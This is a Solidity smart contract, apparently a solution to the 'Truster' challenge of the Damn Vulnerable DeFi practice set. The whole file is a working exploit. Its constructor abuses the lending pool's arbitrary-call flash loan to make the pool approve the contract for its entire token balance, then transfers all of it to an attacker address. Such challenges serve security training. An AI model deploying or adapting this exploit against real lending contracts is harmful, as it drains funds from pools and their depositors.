/// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TrusterLenderExploit {
    constructor(
        address pool,
        address token,
        address attacker
    ) {
        TrusterLender trusterLender = TrusterLender(pool);
        IERC20 damnValuableToken = IERC20(token);
        uint256 poolBalance = damnValuableToken.balanceOf(pool);
        bytes memory approveExploit = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolBalance
        );
        trusterLender.flashLoan(0, address(this), token, approveExploit);
        damnValuableToken.transferFrom(pool, attacker, poolBalance);
    }
}

interface TrusterLender {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}
